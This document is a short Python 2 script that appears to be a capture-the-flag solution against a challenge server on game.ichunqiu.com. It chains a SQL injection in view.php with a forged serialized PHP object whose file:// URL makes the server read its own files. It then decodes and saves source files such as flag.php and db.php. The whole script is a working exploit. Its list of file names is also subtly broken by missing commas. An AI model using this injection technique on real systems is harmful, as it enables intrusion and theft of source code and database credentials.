import requests
from bs4 import BeautifulSoup as bs


filelist=[
        'index.php',
        'flag.php',
        'db.php',
        'user.php'
        'join.php',
        'join.ok.php'
        'bootstrap.php'
        'view.php',
        'lib.php',
        'error.php'
        'login.php',
        'login.ok.php'
        ]


for f in filelist:
    g=open(f,'w')
    data=requests.get("http://6ef39b3796ef4085a29446c3747fad853136e011553f4bbf.game.ichunqiu.com/view.php?no=1%20and%200%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:5:%22image%22;s:3:%22age%22;i:12;s:4:%22blog%22;s:"+str(len("file:///var/www/html/"+f))+":%22"+'file:///var/www/html/'+f+"%22;}%27#").content
    be=bs(data,"lxml")
    #print be.iframe
    source=str(be.iframe.attrs['src']).lstrip("data:text/html;base64,").decode('base64')
    g.write(source)
    g.close


